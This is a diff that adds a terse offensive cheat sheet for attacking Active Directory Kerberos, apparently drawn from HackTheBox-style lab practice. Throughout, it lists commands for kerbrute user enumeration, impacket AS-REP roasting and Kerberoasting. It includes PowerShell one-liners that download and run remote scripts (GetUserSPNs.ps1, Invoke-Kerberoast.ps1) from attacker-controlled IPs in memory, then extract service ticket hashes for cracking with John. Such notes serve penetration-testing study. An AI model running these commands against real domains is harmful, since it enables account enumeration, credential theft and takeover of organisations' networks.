@@ -1,0 +1,13 @@
+#Enum users
+kerbrute userenum [USERFILE] --dc [IP] -d [Domain.com]
+
+#Enum user and their TGTs
+impacket-GetNPUsers -request -dc-ip 10.10.10.161 htb.local/
+
+
+#Attacking the SPN:
+    0. powershell IEX(New-Object Net.Webclient).DownloadString("http://192.168.49.170/GetUserSPNs.ps1")
+    1. Add-Type -AssemblyName System.IdentityModel
+    2. New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+    3. powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.140:8000/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat John"
+    4.copy the hashes and crack it with John
